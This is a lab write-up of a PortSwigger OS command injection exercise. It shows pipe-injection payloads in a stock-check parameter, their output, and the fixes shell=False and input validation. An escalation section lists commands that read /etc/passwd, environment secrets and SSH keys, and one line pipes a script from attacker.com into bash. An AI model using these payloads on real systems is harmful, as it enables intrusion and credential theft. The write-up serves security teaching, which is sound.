# Lab 1: OS Command Injection — Simple Case

## Executive Summary

This lab demonstrates exploitation of an OS command injection vulnerability in its most direct form — no encoding, no filter bypass, and no obfuscation required. The application's stock checking functionality constructs an OS command using user-supplied `productId` and `storeId` parameter values and passes it to a shell for execution without any sanitization. By appending a pipe operator and an arbitrary OS command to the `storeId` parameter, I achieved immediate arbitrary command execution on the underlying server. The attack was escalated progressively: initial `whoami` execution confirmed code execution and identified the running user context, `ls` enumerated the working directory and revealed a shell script named `stockreport.sh`, and `cat stockreport.sh` exposed the complete vulnerable script responsible for the stock check functionality. This exploitation chain demonstrates full unauthenticated OS-level access to the server with no preconditions beyond the ability to submit a stock check request.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | OS Command Injection |
| **Difficulty**         | Apprentice |
| **Vulnerability**      | OS Command Injection — Unsanitized User Input in Shell Command Construction |
| **Risk**               | Critical - Arbitrary OS Command Execution, Full Server Compromise |
| **Completion**         | May 2026 |

## Objective

Exploit an OS command injection vulnerability in the stock checking functionality by injecting shell commands into the `storeId` parameter, confirm arbitrary command execution via `whoami`, enumerate the server environment, and expose the vulnerable backend script responsible for the stock check operation.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception and HTTP history analysis
- Burp Repeater for payload delivery and iterative command execution

**Target:** `storeId` parameter in the stock check POST request — user-supplied value concatenated directly into a shell command executed server-side without sanitization

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment confirming the challenge title "OS command injection, simple case" with Burp Suite Professional configured and actively intercepting traffic.

<img width="1920" height="982" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/9789e929-6e94-4e11-a61d-22d70adbce2d" />

*Lab 1 OS Command Injection environment displaying the simple case challenge title (right) | Burp Suite Professional licensed to Gurpreet Singh, configured and intercepting with active proxy visible (left)*

### 2. Attack Surface Identification

Interacted with the stock checking feature on a product page to generate a stock check request. The request was captured through Burp Proxy and identified in HTTP history. The POST body revealed two user-controlled parameters: `productId` and `storeId` — both of which are candidates for OS command injection if either is incorporated into a shell command server-side.

<img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/f0fafded-9a34-4ba2-8390-3bd3c6bf31a9" />

*Stock check request captured in HTTP history — POST body showing `productId=2&storeId=1`. Both parameters are user-controlled and potentially incorporated into a server-side shell command for stock lookup*

**Request Captured:**
```http
POST /product/stock HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=2&storeId=1
```

**Injection Point Analysis:**

The stock check functionality queries inventory data that is likely maintained in a system-level script or external data source. A common implementation pattern for this type of feature in legacy or poorly secured applications is to pass the product and store identifiers directly to a shell command:

```bash
# Likely vulnerable backend command construction
stockreport.pl <productId> <storeId>
# or
./stockreport.sh 2 1
```

If the parameter values are interpolated into a shell command string without sanitization, shell metacharacters — including `|` (pipe), `;` (semicolon), `&&`, `||`, and backticks — can be used to append or inject additional commands that the shell executes in the same context.

### 3. Baseline Request Validation

Forwarded the stock check request to Burp Repeater and sent it unmodified to establish a baseline response before injecting any payloads.

<img width="1920" height="982" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/624cd1eb-fe9f-498a-8381-f7f501718834" />

*Unmodified stock check request sent in Repeater — 200 OK response returning "32 units" confirming the stock check functionality is operational and that `storeId=1` produces a valid numeric result from the backend command*

**Response:** 200 OK — `32` units returned.

**Analysis:** The backend command executes successfully with legitimate parameter values and returns a numeric stock count. The response is minimal — just a number — which means any command injection output will appear directly in the response body in place of or alongside the stock count. This is a reflected output scenario, making injection confirmation immediate and unambiguous.

### 4. OS Command Injection — Initial Execution Confirmed

Injected a pipe operator followed by `whoami` into the `storeId` parameter. The pipe operator (`|`) in Unix shell syntax redirects the output of the left-hand command as input to the right-hand command. In this context, it causes the shell to execute `whoami` after the stock script completes and return its output in the response.

**Attack Payload:**
```http
POST /product/stock HTTP/1.1

productId=2&storeId=1|whoami
```

**Shell Command Constructed and Executed Server-Side:**
```bash
# Application constructs something equivalent to:
./stockreport.sh 2 1|whoami

# Shell executes both commands:
# 1. ./stockreport.sh 2 1  — legitimate stock check
# 2. whoami                 — attacker-injected command
# Output of whoami returned in HTTP response
```

<img width="1920" height="982" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/625333f9-5df4-4c73-82ef-4dd5d30b13f1" />

*`storeId=1|whoami` payload submitted — 200 OK response returns `peter-CEB7wv` in the response body. OS command injection confirmed — the server executed `whoami` and returned the current process username directly in the HTTP response*

**Response:** 200 OK — `peter-CEB7wv` returned.

**OS Command Injection Confirmed:**
- Server executed the injected `whoami` command
- Running user context identified: `peter-CEB7wv`
- Command output returned directly in HTTP response body
- Full shell command execution capability established

**Significance of the Running User:**
The username `peter-CEB7wv` indicates a non-root application service account. In a real engagement this would be noted as the initial access context — further privilege escalation steps would follow to determine whether this account has access to sensitive files, sudo rights, SUID binaries, or other escalation paths. For this lab, arbitrary command execution under this user context is the confirmed objective.

### 5. Directory Enumeration — Filesystem Reconnaissance

With command execution confirmed, escalated to filesystem reconnaissance by injecting `ls` to enumerate the contents of the working directory the application runs from.

**Attack Payload:**
```http
POST /product/stock HTTP/1.1

productId=2&storeId=1|ls
```

**Shell Command Executed:**
```bash
./stockreport.sh 2 1|ls
```
<img width="1920" height="982" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/2a1f9d53-88cd-4edd-9705-074ba39da6c8" />

*`storeId=1|ls` payload submitted — 200 OK response returns `stockreport.sh` as the directory listing output, confirming the application's working directory contains the shell script responsible for the stock check functionality*

**Response:** 200 OK — `stockreport.sh` returned.

**Analysis:** The working directory contains `stockreport.sh` — the shell script the application invokes to perform stock checks. This is the exact script that constructs the vulnerable command incorporating user-supplied parameter values. Reading this script will expose the vulnerable code directly.

### 6. Vulnerable Script Exposed

Injected `cat stockreport.sh` to read the complete contents of the stock check script and expose the vulnerable command construction logic.

**Attack Payload:**
```http
POST /product/stock HTTP/1.1

productId=2&storeId=1|cat stockreport.sh
```

**Shell Command Executed:**
```bash
./stockreport.sh 2 1|cat stockreport.sh
```
<img width="1920" height="982" alt="LAB1_ss6" src="https://github.com/user-attachments/assets/3103ff75-d3a5-412d-99a5-f25da0c8ae6e" />

*`storeId=1|cat stockreport.sh` payload submitted — 200 OK response returns the complete contents of `stockreport.sh`, exposing the vulnerable script that constructs OS commands from unsanitized user input. The injection point in the script is directly visible in the source*

**Response:** 200 OK — complete contents of `stockreport.sh` returned.

**Script Analysis:** The returned script content reveals the exact code responsible for the vulnerability — the `productId` and `storeId` parameter values are incorporated into a shell command string without any sanitization, quoting, or validation. The injection point is visible directly in the source.

**Lab objective achieved:** Arbitrary OS command execution demonstrated, server environment enumerated, vulnerable script source code exposed.

## Technical Impact

**Severity: Critical (CVSS 10.0)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

Scope is Changed (S:C) and all three impact dimensions are High because OS command injection provides direct access to the underlying server operating system — impact extends well beyond the application boundary to the host system, adjacent network, and any services or data accessible from the compromised server.

**Primary Vulnerability:**

**CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)**
- `storeId` and `productId` parameter values interpolated directly into a shell command string
- No sanitization, escaping, or validation applied to either parameter before shell execution
- Shell metacharacters (`|`, `;`, `&&`, backticks) accepted and processed by the shell
- Complete command execution capability granted to any unauthenticated user

**Complete Attack Chain:**

```
Stock Check Functionality Identified
        ↓
POST Request Captured: productId=2&storeId=1
        ↓
Both Parameters Identified as Candidates for Shell Injection
        ↓
storeId=1|whoami Submitted
        ↓
Shell Executes whoami — Returns peter-CEB7wv
        ↓
OS Command Injection Confirmed — User Context Identified
        ↓
storeId=1|ls — Working Directory Enumerated
        ↓
stockreport.sh Identified in Working Directory
        ↓
storeId=1|cat stockreport.sh — Vulnerable Script Source Exposed
        ↓
Full Command Execution and Reconnaissance Complete
```

**Shell Injection Operator Reference:**

The pipe operator is one of several shell metacharacters that enable command injection. Each has different behavior and applicability depending on the surrounding command structure:

| Operator | Syntax | Behavior | Use Case |
|----------|--------|----------|----------|
| `\|` (used) | `cmd1\|cmd2` | Pipe stdout of cmd1 to stdin of cmd2; both execute | Output of injected command returned when cmd2 consumes stdin |
| `;` | `cmd1;cmd2` | Execute cmd1, then cmd2 sequentially | Both commands run; both outputs potentially returned |
| `&&` | `cmd1&&cmd2` | Execute cmd2 only if cmd1 succeeds | Useful when original command must succeed first |
| `\|\|` | `cmd1\|\|cmd2` | Execute cmd2 only if cmd1 fails | Useful when original command must fail |
| `` ` ` `` | `` cmd1`cmd2` `` | Execute cmd2 inline, substitute output | Inline substitution into the original command |
| `$()` | `cmd1$(cmd2)` | Execute cmd2 inline, substitute output | Modern equivalent of backtick substitution |

The pipe was effective here because the stock script output (a number) was piped to `whoami` — `whoami` does not consume stdin and simply executes and outputs its result regardless. In other contexts, `;` or `&&` may be more reliable.

**Escalation Path — What Follows Initial Access:**

`whoami`, `ls`, and `cat` demonstrate the injection and enumerate the immediate environment. In a real engagement the same channel would be used to:

```bash
# System and network reconnaissance
id                          # Full user context including group memberships
uname -a                    # OS version and kernel
cat /etc/passwd             # All system accounts
cat /etc/hosts              # Internal network hostnames
ifconfig / ip addr          # Network interfaces and addresses
env                         # Environment variables — API keys, credentials, secrets

# Privilege escalation reconnaissance
sudo -l                     # Sudo permissions for current user
find / -perm -4000 2>/dev/null   # SUID binaries — potential privilege escalation
cat /etc/crontab            # Cron jobs — potential scheduled task abuse
ls -la /home/               # Other user home directories

# Credential access
find / -name "*.conf" 2>/dev/null   # Configuration files
find / -name "*.env" 2>/dev/null    # Environment files with secrets
cat ~/.ssh/id_rsa            # SSH private key if present

# Persistence and lateral movement
curl http://attacker.com/shell.sh | bash   # Remote payload delivery
```

Every one of these commands is executable through the same `storeId=1|<command>` injection channel with no additional setup.

**Real-World Impact:**

| Consequence | Mechanism |
|-------------|-----------|
| Complete server compromise | Arbitrary command execution as application user |
| Credential theft | Read config files, environment variables, SSH keys |
| Internal network access | Server used as pivot point for lateral movement |
| Data exfiltration | Read database files, application data, user data |
| Persistence | Write cron jobs, SSH authorized_keys, web shells |
| Service disruption | `rm -rf`, process killing, resource exhaustion |
| Supply chain attack | Modify application code or deployment scripts |

**Why This Is the Most Severe Vulnerability Class:**

SQL injection reads from the database. Path traversal reads from the filesystem. OS command injection executes arbitrary code on the operating system. It is not bounded by the application's functionality, the database's contents, or the filesystem permissions of the web root — it operates at the OS level with the full capabilities of the process account. In terms of blast radius, OS command injection is equivalent to having an interactive shell on the server.

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Stock check and similar operational features as high-value injection targets — they commonly invoke external scripts or system commands with user-supplied identifiers
- Baseline request first to understand normal output format before injecting
- Progressive escalation: `whoami` for confirmation, `ls` for enumeration, `cat` for source code exposure
- Pipe operator as the first metacharacter to test — reliable when the injected command does not depend on the original command's success or output

**Critical Security Insights:**

**1. User Input Must Never Be Passed to a Shell:**
The root cause of OS command injection is always the same: user-supplied data reaches a shell interpreter. Whether through `system()`, `exec()`, `popen()`, `subprocess.call(shell=True)`, backtick operators, or shell scripts that incorporate arguments directly, the vulnerability exists whenever untrusted input participates in shell command construction. There is no sanitization approach that reliably prevents shell injection — the only adequate fix is architectural.

**2. The Correct Fix — Parameterized Command Execution:**

**Vulnerable Pattern:**
```python
# User input reaches the shell — critically unsafe
import subprocess
product_id = request.POST["productId"]
store_id = request.POST["storeId"]
result = subprocess.run(f"./stockreport.sh {product_id} {store_id}", shell=True, capture_output=True)
```

**Secure Pattern:**
```python
# Arguments passed as a list — shell never invoked
import subprocess
product_id = request.POST["productId"]
store_id = request.POST["storeId"]

# Validate inputs first — ensure they are integers
if not product_id.isdigit() or not store_id.isdigit():
    return 400

result = subprocess.run(
    ["./stockreport.sh", product_id, store_id],
    shell=False,          # Critical — no shell interpretation
    capture_output=True
)
```

When `shell=False` and arguments are passed as a list, the OS executes the script directly with the arguments as discrete parameters. No shell interpreter is involved — there is no shell, so there are no shell metacharacters, no pipe operators, no command substitution, and no injection surface. The arguments are passed to the script verbatim as strings, and the script receives them as `$1` and `$2` without shell processing.

**3. Input Validation as Defense-in-Depth:**
Even with parameterized execution, the `productId` and `storeId` values should be validated as integers before use — they have no legitimate reason to contain letters, symbols, or pipe characters. Input validation does not fix OS command injection alone, but it provides a secondary layer that fails safely:

```python
if not product_id.isdigit() or not store_id.isdigit():
    return 400  # Reject before the command is ever constructed
```

**4. Shell Scripts That Accept Arguments Are High-Risk Surfaces:**
`stockreport.sh` is a shell script that takes command-line arguments and uses them in shell operations. Any application that invokes shell scripts with user-supplied data as arguments is potentially vulnerable, regardless of what language the application itself is written in. The injection happens at the shell script level — the application language is irrelevant once the data reaches a shell.

**5. OS Command Injection Is Immediately Escalatable:**
Unlike many vulnerabilities that require multiple steps to convert into impactful access, OS command injection provides full server access in a single step. The transition from "parameter is injectable" to "complete server compromise" requires no additional technique, no privilege escalation, and no secondary vulnerability. The injection is the compromise.

## References

1. PortSwigger Web Security Academy - OS Command Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-78 - Improper Neutralization of Special Elements used in an OS Command
4. OWASP OS Command Injection Defense Cheat Sheet
5. OWASP Testing Guide - Testing for OS Command Injection (OTG-INPVAL-013)
6. Python Documentation - subprocess module, shell=False

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Executing OS commands on systems without explicit written authorization, accessing server filesystems, or any form of unauthorized remote code execution is illegal under applicable laws worldwide.
